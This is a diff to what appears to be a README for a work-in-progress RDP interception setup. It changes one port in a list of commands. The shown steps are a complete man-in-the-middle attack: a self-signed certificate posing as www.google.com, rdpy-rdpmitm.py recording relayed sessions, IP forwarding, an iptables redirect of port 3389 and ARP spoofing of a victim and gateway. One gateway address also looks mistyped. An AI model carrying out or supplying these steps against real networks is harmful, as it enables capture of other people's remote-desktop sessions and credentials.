@@ -10,7 +10,7 @@ This is still a work in progress
 Basic steps for using rdpy-rdpmitm.py  
 ```  
 openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout mysitename.key -out mysitename.crt -subj '/C=US/ST=Oregon/L=Portland/CN=www.google.com’
-rdpy-rdpmitm.py -o /tmp -l 3389 -k mysitename.key -c mysitename.crt -r x.x.x.x:3389
+rdpy-rdpmitm.py -o /tmp -l 3390 -k mysitename.key -c mysitename.crt -r x.x.x.x:3389
 echo 1 > /proc/sys/net/ipv4/ip_forward
 iptables -t nat -A PREROUTING -p tcp --destination-port 3389 -j REDIRECT --to-port 3390
 arpspoof -i eth0 -t 172.16.173.132 162.16.173.2 
